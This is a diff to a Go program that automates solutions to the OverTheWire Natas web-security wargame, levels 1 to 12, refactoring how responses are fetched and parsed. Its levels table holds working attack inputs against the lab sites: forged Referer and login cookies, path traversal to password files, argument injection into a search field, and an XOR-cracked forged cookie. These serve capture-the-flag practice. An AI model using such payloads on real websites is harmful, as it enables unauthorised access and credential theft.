@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"encoding/base64"
 	"encoding/hex"
 	"flag"
@@ -23,23 +22,40 @@ type Grabber interface {
 	Grab(http.Request) string
 }
 
-type Prefixed struct {
-	Prefix string
-	Length int
-}
+type Grab struct{}
 
-func (p Prefixed) Grab(r http.Request) string {
+var grab Grab
+
+func (g Grab) Grab(r http.Request) string {
 	buf = buf[:0]
 	resp, err := http.DefaultClient.Do(&r)
 	e(err)
 	io.Copy(&buf, resp.Body)
 	resp.Body.Close()
-	index := bytes.Index(buf, []byte(p.Prefix))
+	return string(buf)
+}
 
-	if index < 0 || len(buf) < index+len(p.Prefix)+p.Length {
-		panic(errors.Error("failed to get password"))
+type Text struct {
+	Text string
+}
+
+func (t Text) Grab(http.Request) string {
+	return t.Text
+}
+
+type Prefixed struct {
+	Grabber
+	Prefix string
+	Length int
+}
+
+func (p Prefixed) Grab(r http.Request) string {
+	source := p.Grabber.Grab(r)
+	index := strings.Index(source, p.Prefix)
+	if index < 0 || len(source) < index+len(p.Prefix)+p.Length {
+		panic(errors.Error("failed to get prefixed data"))
 	}
-	return string(buf[index+len(p.Prefix) : index+len(p.Prefix)+p.Length])
+	return source[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]
 }
 
 type Path struct {
@@ -177,14 +193,6 @@ func (sd SetData) Set(r http.Request, s Setter) {
 	}
 }
 
-type Text struct {
-	Text string
-}
-
-func (t Text) Grab(http.Request) string {
-	return t.Text
-}
-
 type Cookie struct {
 	Name string
 }
@@ -241,18 +249,18 @@ func (c Combine) Grab(r http.Request) string {
 }
 
 var levels = [...]Grabber{
-	Prefixed{"The password for natas1 is ", 32},
-	Prefixed{"The password for natas2 is ", 32},
-	Path{Prefixed{"natas3:", 32}, Text{"/files/users.txt"}},  // image @ /files/pixel.png, go to folder, find users.txt
-	Path{Prefixed{"natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
-	Headers{Prefixed{"The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
-	Headers{Prefixed{"The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
-	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
-	Get{Prefixed{"<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
-	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}, nil},
-	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
-	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
-	Headers{Prefixed{"The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
+	Prefixed{grab, "The password for natas1 is ", 32},
+	Prefixed{grab, "The password for natas2 is ", 32},
+	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}},  // image @ /files/pixel.png, go to folder, find users.txt
+	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
+	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
+	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
+	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
+	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
+	Post{Prefixed{grab, "The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}, nil},
+	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
+	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
+	Headers{Prefixed{grab, "The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
 }
 
 func e(err error) {
